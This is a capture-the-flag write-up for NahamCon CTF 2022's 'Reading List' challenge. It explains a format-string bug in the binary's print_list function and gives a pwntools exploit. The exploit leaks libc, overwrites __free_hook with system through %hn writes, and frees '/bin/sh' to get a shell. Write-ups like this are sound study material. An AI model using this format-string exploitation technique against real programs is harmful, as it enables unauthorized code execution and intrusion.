---
title: "[Pwn] Reading List [Nahamcon CTF 2022]"
date: 2022-05-06 22:59:00
---

# 0x0 Introduction

Author: @M_alpha#3534

Try out my new reading list maker! Keep track of what books you would like to read.

files: [reading_list](reading_list), [libc-2.31.so](libc-2.31.so)

# 0x1 Mitigation

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

# 0x2 Vuln

the main vuln in this program is in the `sym.print_list`, it direct print what exactly in the heap. This allow us to have arbitrary read and write in the memory space.

```
sym.imp.printf(*(_obj.booklist + var_4h * 8));
```

Since all the protection is on, the simplest way to do this program is to overwrite `__free_hook` to `system`. Then, when we call `free("/bin/sh")`, `system("/bin/sh")` will be called and we will get a shell.


# 0x3 Exploit

credit: @Green-Avocado

```
libc = ELF('libc-2.31.so')

io = start()

io.sendlineafter(b"What is your name: ", b"")

io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"Enter the book name: ", b"%23$p")

io.sendlineafter(b"> ", b"1")
io.recvuntil(b"1. ")
libc.address = int(io.recvline(), 0) - libc.libc_start_main_return

info("LIBC: " + hex(libc.address))

io.sendlineafter(b"> ", b"4")
io.sendlineafter(b"What is your name: ", flat([
    libc.sym['__free_hook'] + 0,
    libc.sym['__free_hook'] + 2,
    libc.sym['__free_hook'] + 4,
    ]))

fmt = ""
written = 0
to_write = 0

io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"Enter the book name: ", f"%{(libc.sym['system']) % 0x10000}c%22$hn".encode())

io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"Enter the book name: ", f"%{(libc.sym['system'] >> 0x10) % 0x10000}c%23$hn".encode())

io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"Enter the book name: ", f"%{(libc.sym['system'] >> 0x20) % 0x10000}c%24$hn".encode())

io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"Enter the book name: ", b"/bin/sh")

io.sendlineafter(b"> ", b"3")
io.sendlineafter(b": ", b"5")

io.interactive()
```


# 0x2 Flag

None